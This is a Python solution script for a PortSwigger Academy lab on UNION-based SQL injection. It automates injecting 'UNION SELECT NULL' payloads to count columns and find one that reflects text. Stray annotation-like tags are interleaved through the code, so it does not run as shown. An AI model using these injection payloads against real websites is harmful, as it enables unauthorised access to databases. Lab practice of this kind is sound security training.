#!/usr/bin/env python3
import requests
import sys

<vul/># Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text</vul>

# API Parameters
<vul/>url = 'https://abcd.web-security-academy.net/page'</vul>
params = {'category': 'Lifestyle'}
<vul/>null = ["'UNION", 'SELECT', 'NULL', '--']</vul>
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
<vul/><vul/>response = api_session.get(url, params=sqli)</vul></vul>

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


<vul/>def sqli_union_1_lab(response):
    while not response.ok:
        null.pop(-1)</vul>
        null.extend([',', 'NULL', '--'])
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        response = api_session.get(url, params=sqli)
    print(f"There are {null.count('NULL')} columns")

    return null


<vul/>def sqli_union_2_lab(response, null):</vul>
    step = null.index('NULL')
    <vul/>column = 0
    while not response.ok:</vul>
        index = null.index('NULL', step)
        <vul/>step = (index + 1)
        column += 1
        null[index] = "'VULNERABLE_STRING'"</vul>
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        <vul/>response = api_session.get(url, params=sqli)
        null[index] = "NULL"</vul>
    print(f'Column {column} contains inserted text')


<vul/>if __name__ == '__main__':</vul>

    <vul/>null = sqli_union_1_lab(response=response)
    sqli_union_2_lab(response=response, null=null)</vul>
